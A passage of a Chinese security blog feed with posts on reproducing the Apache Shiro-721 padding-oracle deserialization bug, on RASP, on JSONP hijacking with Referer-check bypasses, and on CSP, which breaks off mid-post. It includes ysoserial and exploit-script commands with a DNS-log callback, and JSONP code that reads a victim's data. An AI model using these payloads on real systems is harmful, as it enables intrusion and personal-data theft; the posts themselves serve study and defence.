中使用的AES(高级加密标准)加密算法，就是一种对称加密的分组加密算法。</p><p>加解密密钥的长度：一般为128 bits , 即 16 Bytes</p><p>分组加密的加密模式：CBC加密模式</p><p>加密模式对应的填充方式：Padding填充机制</p><h4 id="密码学体制介绍"><a href="#密码学体制介绍" class="headerlink" title="密码学体制介绍"></a>密码学体制介绍</h4><p>1、按照密钥特征的不同划分，密码体制可以分为两类 : “对称加密” 和 “非对称加密”</p><blockquote><p>对称加密 : 加密 , 解密过程使用的密钥相同(AES、DES等)<br>非对称加密 : 加密 , 解密过程使用不同的密钥(RSA、DSA)</p></blockquote><p>2、按照加密方式的不同,密码体制可以分为两类:”分组密码( 块密码 )” 和 “流密码( 序列密码 )”</p><ul><li><p>分组密码( 块密码 ) : 当加密明文时 , 会先将明文编码表示为二进制序列( 明文流 ) , 然后将其分为若干个固定长度的组 , 最后分别对每个组进行加密 , 生成密文流.</p><ul><li><p>分组加密算法中有 5 种可选的加密变换方式( 加密模式 )</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ECS ( Electronic Codebook Book , 电话本模式 )</span><br><span class="line">CBC ( Cipher Block Chaining , 密码分组链接模式 )</span><br><span class="line">CTR ( Counter , 计算器模式 )</span><br><span class="line">CFB ( Cipher FeedBack , 密码反馈模式 )</span><br><span class="line">OFB ( Output FeedBack , 输出反馈模式 )</span><br></pre></td></tr></table></figure></li></ul></li><li><p>流密码( 序列密码 ) : 当加密明文时 , 会先将明文编码表示为二进制序列( 明文流 ) , 然后由种子密钥生成一个密钥流 , 最后利用加密算法把明文流和密钥流加密，生成密文流.</p></li></ul><h4 id="CBC加密模式"><a href="#CBC加密模式" class="headerlink" title="CBC加密模式"></a>CBC加密模式</h4><p>将明文切分成若干小段,然后每一段分别与上一段的密文进行异或运算,再与密钥进行加密，生成本段明文的密文,这段密文用于下一段明文的加密。</p><p>第一段明文没有对应的密文,为了确保分组的唯一性,CBC 加密模式使用了初始化向量(IV , Initialization Vector)。初始化向量是一个固定长度的随机数,该向量会作为密文第一个块,随密文一同传输。</p><p>在 CBC 模式中,初始化向量(IV)的长度与分组大小相同，为 16 Bytes(128 bits),因为链接模式中的异或操作是等长操作。</p><h4 id="Padding-填充机制"><a href="#Padding-填充机制" class="headerlink" title="Padding 填充机制"></a>Padding 填充机制</h4><p>Padding填充机制是加密模式下的填充方式，分组加密时，会把明文切割成多个分组，”Padding” 用于在最后一个分组的结尾填充一些额外的 bits , 使分组成为标准的 16 Bytes</p><p>CBC 加密模式下可用的Padding方式有 3 个 :</p><ul><li>1、AES&#x2F;CBC&#x2F;NoPadding : 明文长度必须是 8 Bytes 的倍数 , 否则会报错 .</li><li>2、AES&#x2F;CBC&#x2F;PKCS5Padding : 以完整字节填充 , 每个填充字节的值是用于填充的字节数 . 即要填充 N 个字节 , 每个字节都为 N.<br>举例 : 使用 PKCS5Padding 方式填充 3 个字节 : | AA BB CC DD EE 03 03 03 |</li><li>3、AES&#x2F;CBC&#x2F;ISO10126Padding : 以随机字节填充 , 最后一个字节为填充字节的个数 .<br>举例 : 使用 ISO10126Padding 方式填充 5 个字节 : | AA BB CC A9 3B 78 04 05 |</li></ul><p>在 Apache Shiro中，使用的是PKCS5Padding方式。</p><h4 id="Padding-Oracle-Attack-填充-Oracle-攻击"><a href="#Padding-Oracle-Attack-填充-Oracle-攻击" class="headerlink" title="Padding Oracle Attack( 填充 Oracle 攻击 )"></a>Padding Oracle Attack( 填充 Oracle 攻击 )</h4><p>Padding Oracle Attack是一种针对CBC模式分组加密算法的攻击。它可以在不知道密钥（key）的情况下，通过对padding bytes的尝试，还原明文，或者构造出任意明文的密文。</p><p><a href="https://yinwc.github.io/2018/07/30/Padding-Oracle-Attack/#Pading-Oracle-Attack%E6%94%BB%E5%87%BB">之前的文章:Padding Oracle Attack</a></p><p>这里的 Oracle 与甲骨文公司没有任何关系。Padding Oracle Attack 也不是针对某一种分组加密算法的攻击,而是针对 CBC加密模式的。</p><p>密码学中的 Oracle 是一种通过接收特定加密数据，解密并验证填充是否正确的方式。</p><h4 id="CBC-Byte-Flipping-Attack-CBC字节翻转攻击"><a href="#CBC-Byte-Flipping-Attack-CBC字节翻转攻击" class="headerlink" title="CBC Byte-Flipping Attack (CBC字节翻转攻击)"></a>CBC Byte-Flipping Attack (CBC字节翻转攻击)</h4><p>通过Padding Oracle Attack可以在不知道密钥(key)的情况下，获取全部明文的值。<br>通过CBC Byte-Flipping Attack（CBC字节翻转攻击） 可以实现对明文的篡改。</p><p>CBC字节翻转攻击的原理 : 通过损坏密文字节来改变明文字节 。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>复现环境： JDK1.8 + Tomcat8 + Shiro-1.4.1 .<br>首先从 Github 上下载一份 Shrio 源码 , 并切换到存在漏洞的分支( 1.4.1 )</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/shiro.git</span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-1.4.1</span><br></pre></td></tr></table></figure><p>启动IDEA，配置tomcat（别用最新的版本的tomcat，容易出错）<br>并设置 samples-web:war 作为 Artifacts<br>然后启动tomcat</p><p><img src="/2021/06/16/shiro721%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="shiro721漏洞复现"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1、首先通过 YSoSerial 生成可利用的 Payload . 由于之前配置 pom.xml 时没有添加任何组件 , 所以使用 URLDNS Payload 来探测漏洞是否存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 &quot;ping milon0.ceye.io&quot; &gt; payload.class</span><br></pre></td></tr></table></figure><p>2、获取一个有效的Remember Cookie</p><p>[<img src="/2021/06/16/shiro721%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="shiro721漏洞复现"></p><p>[<img src="/2021/06/16/shiro721%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="shiro721漏洞复现"></p><p>此处注意删除JSESSIONID，否则后续无法利用</p><p>3、通过 Padding Oracle Attack 生成 Evil Rememberme cookie:<br>注意：此exp爆破时间较长，建议使用 <code>ysoserial</code> 生成较短的 payload 验证（eg: ping 、 touch &#x2F;tmp&#x2F;success, etc），约 1 个多小时可生成正确的 rememberme cookie，生成成功后将自动停止运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exp.py</span><br><span class="line">Usage: shiro_exp.py &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;</span><br><span class="line">python shiro_exp.py http://localhost:8080/samples_web_war/home.jsp xSEnrD1VPnQ49Tke8d9s7yXyBdKmcZTvF5KZ+8trI5/CQNSwsTJPlfBIEWj4ewouARb8LY4n1BQClrG6+Y5NsyyRhJwjbMKP9DenW7Dd78k9xeWfQZStuyyVsPG3Yq+fAgisJZ706Nzl0Sc2BsoA4COM2Frj5H4Tu3XQr3yer4lQawGdQPT8UCj4XqzuU9xgmmAWzlfEBe0f217/rhFF0dtLogcX7Jw1E0Q5xnoiiEf1Q76ynr/wKb74FqS0UfCHj67lE7yYYd1cjRw4IuM2c/JGppP5rMbuq7Nb5D/UrkMv/Cqv777YbQx90QjGw50v13NPjfoki6lgqwaI+woUh4thZQM6mHHTvE+A2S/a1sNJhYodne/9BQx5iONqjICnGRC5om9IG9XAm+lJ6ED6P1xxSqFNiXWh7JqCFk7YeEwpZoqLYR8EYq+uxqyOwsagOQSYnHVIzNkIcuNcvjBkDtRf37+T/0n0yz/8I3gYL+sV4eOh5ITXpKHTKdprKof4 payload.class</span><br></pre></td></tr></table></figure><p>4、使用Evil Rememberme cookie 认证进行反序列化攻击，即可在dnslog平台获取记录。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[CVE-2019-12422 Shiro721 分析<a href="https://www.guildhab.top/2020/11/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E5%88%86%E6%9E%90-%E4%B8%8A/"> 上 ]</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86&quot;&gt;基础知识&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&quot;&gt;漏洞原理</summary>
      
    
    
    
    
    <category term="漏洞" scheme="https://yinwc.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>理解RASP技术</title>
    <link href="https://yinwc.github.io/2021/05/21/%E7%90%86%E8%A7%A3RASP%E6%8A%80%E6%9C%AF/"/>
    <id>https://yinwc.github.io/2021/05/21/%E7%90%86%E8%A7%A3RASP%E6%8A%80%E6%9C%AF/</id>
    <published>2021-05-21T09:53:09.000Z</published>
    <updated>2023-01-28T10:00:01.361Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFrasp">什么是RASP？</a><ul><li><a href="#rasp-vs-waf">RASP vs WAF</a></li></ul></li><li><a href="#php-rasp%E5%AE%9E%E7%8E%B0">PHP-RASP实现</a><ul><li><a href="#php%E6%89%A9%E5%B1%95">php扩展</a></li><li><a href="#php%E4%B8%AD%E7%9A%84rasp%E5%AE%9E%E7%8E%B0">php中的rasp实现</a></li></ul></li><li><a href="#java-rasp%E5%AE%9E%E7%8E%B0">JAVA-RASP实现</a></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="什么是RASP？"><a href="#什么是RASP？" class="headerlink" title="什么是RASP？"></a>什么是RASP？</h2><ul><li><p>RASP：Runtime application self-protection（运行时自我保护）</p></li><li><p>RASP是一种应用安全保护技术，在运行时检测攻击并且进行自我保护。它将保护程序像疫苗一样注入到应用程序中，应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遭受到实际攻击伤害，就可以自动对其进行防御，而不需要进行人工干预。</p></li><li><p>RASP在后端代码运行时做安全监测，但又不侵入后端代码，就得切入Web后端解释器。<br>以Java为例，Java支持以JavaAgent的方式，在class文件加载时修改字节码，在关键位置插入安全检查代码，实现RASP功能。</p><ul><li>同样，PHP也支持对PHP内核做类似的操作，PHP支持PHP扩展，实现这方面的需求。</li></ul></li></ul><h3 id="RASP-vs-WAF"><a href="#RASP-vs-WAF" class="headerlink" title="RASP vs WAF"></a>RASP vs WAF</h3><ul><li>WAF主要通过分析流量中的特征过滤攻击请求，并拦截携带有攻击特征的请求。WAF虽可有效过滤出绝大多数恶意请求，但是不知道应用运行时的上下文，必然会造成一定程度的误报。并且WAF严重依赖于特征库，各种花式绕过，导致特征编写很难以不变应万变。</li><li>RASP的不同就在于运行在应用之中，与应用融为一体，可以获取到应用运行时的上下文，根据运行时上下文或者敏感操作，对攻击进行精准的识别或拦截。于此同时，由于RASP运行在应用之中，只要检测点选取合理，获取到的payload已经是解码过的真实payload，可以减少由于WAF规则的不完善导致的漏报。</li><li>WAF作为应用外围的防线，RASP作为应用自身的安全防护，确保对攻击的有效拦截。RASP带来的性能消耗在5%~10%之间，在一定程度上仍然是可以接受的。由于RASP需要运行在应用中，不能像WAF一样在流量入口统一部署。需要根据应用开发的技术不同使用不同的RASP。比如.net应用与Java应用需要不同的RASP产品，增加了部署成本。</li></ul><h2 id="PHP-RASP实现"><a href="#PHP-RASP实现" class="headerlink" title="PHP-RASP实现"></a>PHP-RASP实现</h2><h3 id="php扩展"><a href="#php扩展" class="headerlink" title="php扩展"></a>php扩展</h3><p>PHP核心由两部分组成，一部分是PHP core，主要负责请求管理，文件和网络操作，另一部分是Zend引擎，Zend引擎负责编译和执行，以及内存资源的分配。</p><h3 id="php中的rasp实现"><a href="#php中的rasp实现" class="headerlink" title="php中的rasp实现"></a>php中的rasp实现</h3><p>参考：<a href="https://security.tencent.com/index.php/blog/msg/166">TRASP的实现</a></p><p>PHP RASP作为PHP解释器的扩展，是一个动态库so文件，PHP语言中类似的动态库很多，比如：mysql.so，RASP和MYSQL扩展的加载方式和运行原理一样，集成在PHP解释器中。</p><p>三个步骤来实现PHP RASP扩展模块：<br>1、预加载<br>任何一个PHP实例都会经过Module init、Request init、Request shutdown和Module shutdown四个过程。</p><p>2、Hook Opcode 或 Hook 内部函数<br>RASP需要监控各个敏感函数的调用，在PHP中比较好的方式便是 Hook Opcode 和 Hook内部函数。</p><p>3、参数获取与分析<br>在完成对敏感函数调用行为的监控后，通过ZEND_CALL_NUM_ARGS和ZEND_CALL_ARG可以获取到函数的参数个数和内容，便可根据函数的参数制定相应的策略。如文件类可以关注是否读取了敏感文件, 数据库操作类是否语法结构发生了变化等等。</p><h2 id="JAVA-RASP实现"><a href="#JAVA-RASP实现" class="headerlink" title="JAVA-RASP实现"></a>JAVA-RASP实现</h2><p>Java RASP 实现的基本思路类似于 Java 中的 AOP 技术（AOP：面向切面编程），将 RASP 的 Hook 代码注入到需要进行检测的地方，根据上下文和关键函数的参数等信息判断请求是否为恶意请求，并终止或继续执行流。</p><p><a href="https://blog.didiyun.com/index.php/2019/01/10/java-rasp/">浅析基于 Java 的 RASP 实现</a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://security.tencent.com/index.php/blog/msg/166">腾讯：RASP攻防 —— RASP安全应用与局限性浅析</a><br><a href="https://xz.aliyun.com/t/7316">从0开始的PHP RASP的学习</a><br><a href="https://c0d3p1ut0s.github.io/%E4%B8%80%E7%B1%BBPHP-RASP%E7%9A%84%E5%AE%9E%E7%8E%B0/">一类PHP RASP的实现</a><br><a href="https://github.com/laruence/taint">鸟哥：taint</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BB%80%E4%B9%88%E6%98%AFrasp&quot;&gt;什么是RASP？&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#rasp-vs-waf&quot;&gt;RASP vs WAF&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/l</summary>
      
    
    
    
    
    <category term="安全开发" scheme="https://yinwc.github.io/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>深入理解JSONP漏洞</title>
    <link href="https://yinwc.github.io/2021/04/30/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JSONP%E6%BC%8F%E6%B4%9E/"/>
    <id>https://yinwc.github.io/2021/04/30/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JSONP%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-30T09:49:34.000Z</published>
    <updated>2023-02-15T05:42:01.449Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3%E5%8F%8A%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F">漏洞危害及利用方式</a><ul><li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F">漏洞利用方式</a></li></ul></li><li><a href="#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95">漏洞测试</a></li><li><a href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88">修复方案</a></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ul><li><p>JSONP是JSON with padding（填充式JSON或参数式JSON）的简写。</p></li><li><p>JSONP是为了解决跨域资源请求而产生的一种解决方案，动态创建<code>&lt;script&gt;</code>标签，然后利用<code>&lt;script&gt;</code>的<code>src</code>不受同源策略约束来跨域获取数据。</p></li><li><p>JSONP由两部~分组成：<code>回调函数</code>和<code>数据</code></p><ul><li>回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。</li></ul></li><li><p>对同源策略免疫的标签：<code>&lt;img&gt;</code> 的<code>src</code>、<code>&lt;link&gt;</code> 的 <code>href</code>、<code>&lt;script&gt;</code>的 <code>src</code></p></li><li><p>JSONP就是利用<code>script</code>标签的<code>src</code>属性实现跨区域请求的<br>JSONP的过程：幼稚园吃午饭，小明吧贴有自己名字的碗（回调函数）给了幼稚园阿姨（服务器）,阿姨给小明盛好饭（json参数）以后又把碗还给了小明。<br>动态创建<code>&lt;script&gt;</code>标签，设置其src，回调函数在src中设置：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var script = document.createElement(&quot;script&quot;);</span><br><span class="line">script.src = &quot;https://api.douban.com/v2/book/search?q=javascript&amp;count=1&amp;callback=handleResponse&quot;;</span><br><span class="line">document.body.insertBefore(script, document.body.firstChild);</span><br></pre></td></tr></table></figure><p>在页面中，返回的JSON作为response参数传入回调函数中，通过回调函数来来操作数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function handleResponse(response)&#123;</span><br><span class="line">    // 对response数据进行操作代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞危害及利用方式"><a href="#漏洞危害及利用方式" class="headerlink" title="漏洞危害及利用方式"></a>漏洞危害及利用方式</h2><p><strong>获取用户的敏感信息</strong><br><code>JSONP是一种敏感信息泄露的漏洞</code>，经过攻击者巧妙而持久地利用，会对企业和用户造成巨大的危害。攻击者通过巧妙设计一个网站，<code>网站中包含其他网站的JSONP漏洞利用代码</code>，将链接通过邮件等形式推送给受害人，<code>如果受害者点击了链接，则攻击者便可以获取受害者的个人的信息</code>，如邮箱、姓名、手机等信息，这些信息可以被违法犯罪分子用作“精准诈骗”。对方掌握的个人信息越多，越容易取得受害人的信任，诈骗活动越容易成功，给受害人带来的财产损失以及社会危害也就越大。</p><h3 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h3><p><strong>（一）利用过程</strong><br>1、用户在网站B 注册并登录，网站B 包含了用户的id，name，email等信息；<br>2、用户通过浏览器向网站A发出URL请求；<br>3、网站A向用户返回响应页面，响应页面中注册了JavaScript的回调函数和向网站B请求的script标签，示例代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function Callback(result)</span><br><span class="line">&#123;</span><br><span class="line">    alert(result.name);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://B.com/user?jsonp=Callback&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>3、用户收到响应，解析JS代码，将回调函数作为参数向网站B发出请求；<br>4、网站B接收到请求后，解析请求的URL，以JSON 格式生成请求需要的数据，将封装的包含用户信息的JSON数据作为回调函数的参数返回给浏览器，网站B返回的数据实例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Callback(&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test@test.com&quot;&#125;)</span><br></pre></td></tr></table></figure><p>5、网站B数据返回后，浏览器则自动执行Callback函数对步骤4返回的JSON格式数据进行处理，通过alert弹窗展示了用户在网站B的注册信息。另外也可将JSON数据回传到网站A的服务器，这样网站A利用网站B的JSONP漏洞便获取到了用户在网站B注册的信息。</p><p><strong>（二）自动化测试工具Selenium + Proxy + 验证脚本</strong></p><p>(1)Selenium：可用于自动化对网页进行测试，“到处”点击按钮、超链接，以期待测试更多的接口；<br>(2)Proxy：用于代理所有的请求，过滤出所有包含敏感信息的JSONP请求，并记录下HTTP请求；<br>(3)验证脚本：使用上述的HTTP请求，剔除referer字段，再次发出请求，测试返回结果中，是否仍包敏感信息，如果有敏感信息，说明这个接口就是我们要找的！</p><p>jsonp_info_leak：<a href="https://github.com/qiaofei32/jsonp_info_leak">https://github.com/qiaofei32/jsonp_info_leak</a></p><p><strong>（三）结合其他漏洞来进行拓展攻击</strong>：<br>1、JSONP 跨域劫持<br>实际上就是由于服务器端对JSONP 的请求来源的检查不严格导致的<br>攻击者模拟用户向有漏洞的服务器发送JSONP请求，然后就获取到了用户的某些信息，再将这些信息发送到攻击者可控的服务器</p><p>2、JSONP 跨域劫持token 实现CSRF<br>通过 jsonp 发起请求，得到泄露的 csrf_token 然后，利用这个token 实现CSRF 攻击</p><p><strong>（四）Referer头绕过</strong><br>1、data:URL<br>使用data URI来构造一个不带HTTP Referer的请求，来绕过检测<br>因为正在处理的代码包含了引号，双引号，以及其他一些被阻止的语句，接着使用base64编码我们的payload（回调函数定义以及脚本包含）<br><code>data:text/plain;base64our_base64_encoded_code:</code></p><p>以下3个HTML标签允许我们使用data URI方案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iframe (在src属性中) – Internet Explorer下不工作</span><br><span class="line">embed (在src属性中) – Internet Explorer及Microsoft Edge下不工作</span><br><span class="line">object (在data属性中) – Internet Explorer及Microsoft Edge下不工作</span><br></pre></td></tr></table></figure><p>2、从HTTPS向HTTP发起请求<br>如果目标网站可以通过HTTP访问，也可以通过将代码托管在一个HTTPS页面来避免发送HTTP Referer。如果从HTTPS页面发起一个HTTP请求，浏览器为了防止信息泄漏是不会发送Referer header。以上我们要将恶意代码托管在一个启用了HTTPS的站点。<br>注意：由于mixed-content安全机制，在浏览器默认设置下是不会工作的。需要受害者手动允许浏览器发出的安全警告。</p><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>人工测试：<br>在浏览器中查找一些关键词，如： <code>callback json jsonp email</code><br>常见的关键词如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cb</span><br><span class="line">callback</span><br><span class="line">jsoncb</span><br><span class="line">jsonp</span><br><span class="line">jQuery</span><br><span class="line">jsoncallback</span><br><span class="line">jsonpcallback</span><br><span class="line">jsoncall</span><br><span class="line">jsonpcall</span><br></pre></td></tr></table></figure><p>注：<br>浏览器中，首先把Preserve log选项勾上，防止页面刷新跳转的时候访问记录被重置，也方便进行下一步的筛选。</p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>防御策略就是检查referer头是否在白名单内。</p><p>1、严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。<br>2、严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application&#x2F;json; charset&#x3D;utf-8 ）。<br>3、严格过滤 callback 函数名及 JSON 里数据的输出。<br>4、严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。<br>5、其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：&#x2F;**&#x2F;、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/">K0rz3n师傅的博客</a><br><a href="https://zhuanlan.zhihu.com/p/149187997">Jsonp漏洞简析及自动化漏洞挖掘脚本编写</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&quot;&gt;漏洞原理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3%E5%8</summary>
      
    
    
    
    
    <category term="漏洞" scheme="https://yinwc.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>CSP、同源策略与跨域请求(JSONP/CORS)</title>
    <link href="https://yinwc.github.io/2021/03/15/CSP%E4%B8%8E%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
    <id>https://yinwc.github.io/2021/03/15/CSP%E4%B8%8E%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</id>
    <published>2021-03-15T02:57:04.000Z</published>
    <updated>2023-03-02T02:23:40.131Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#csp">CSP</a><ul><li><a href="#csp%E7%AE%80%E4%BB%8B">CSP简介</a><ul><li><a href="#%E5%8E%9F%E7%90%86">原理</a></li><li><a href="#%E5%90%AF%E7%94%A8">启用</a></li></ul></li><li><a href="#csp%E7%9A%84%E8%BF%9B%E5%8C%96nonce-script-csp%E5%92%8Cstrict-dynamic">CSP的进化–nonce script CSP和strict-dynamic</a><ul><li><a href="#nonce-script-csp">nonce script CSP</a></li><li><a href="#strict-dynamic">strict-dynamic</a></li></ul></li><li><a href="#csp-bypass%E7%9A%84%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93">CSP Bypass的方法总结</a><ul><li><a href="#url%E8%B7%B3%E8%BD%AC">url跳转</a></li><li><a href="#%5Clink%E6%A0%87%E7%AD%BE%E9%A2%84%E5%8A%A0%E8%BD%BD">&lt;link&gt;标签预加载</a></li><li><a href="#%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A1%A5%E5%85%A8">利用浏览器补全</a></li><li><a href="#%E5%88%A9%E7%94%A8dom-xss">利用DOM XSS</a></li><li><a href="#%E5%88%A9%E7%94%A8css-%E9%9D%99%E6%80%81xss-%E8%8E%B7%E5%8F%96nonce%E5%80%BC">利用CSS 静态xss 获取nonce值</a></li><li><a href="#%E5%88%A9%E7%94%A8%E8%B7%A8%E5%9F%9F%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE">利用跨域传输数据</a></li><li><a href="#%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%89%A7%E8%A1%8Cjs">利用文件上传执行JS</a></li><li><a href="#base%E6%A0%87%E7%AD%BE">base标签</a></li></ul></li></ul></li><li><a href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5sop">同源策略SOP</a><ul><li><a href="#%E5%9F%BA%E7%A1%80">基础</a></li><li><a href="#%E8%A7%84%E9%81%BF%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5">规避同源策略</a><ul><li><a href="#jsonp">JSONP</a></li><li><a href="#cors">CORS</a></li><li><a href="#websocket">WebSocket</a><ul><li><a href="#cors%E4%B8%8Ejsonp%E7%9A%84%E6%AF%94%E8%BE%83">CORS与JSONP的比较</a></li></ul></li></ul></li></ul></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><h3 id="CSP简介"><a href="#CSP简介" class="headerlink" title="CSP简介"></a>CSP简介</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><ul><li>CSP（Content-Security-Policy）内容安全策略,用来防御XSS攻击的技术。CSP是一种白名单策略，通过CSP指定可信的内容来源，让WEB处于一个安全的运行环境中。</li><li>CSP的实质就是白名单策略，预先设定好哪些资源能被加载执行而哪些不能。除了普通的CSP还有个<code>CSPRO</code>(Content-Security-Policy-Report-Only)，区别是后者不限制执行，而是记录违反限制的行为，需要与<code>report-uri</code>一起使用。</li></ul><h4 id="启用"><a href="#启用" class="headerlink" title="启用"></a>启用</h4><ul><li>通过 HTTP 头信息的Content-Security-Policy的字段</li><li>通过网页的<code>&lt;meta</code>&gt;标签<ul><li><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39;&quot;&gt;</code></li></ul></li><li>常规配置：该策略允许加载同源的图片、脚本、AJAX和CSS资源，并阻止加载其他任何资源，对于大多数网站是一个不错的配置。<ul><li><code>default-src ‘none’; 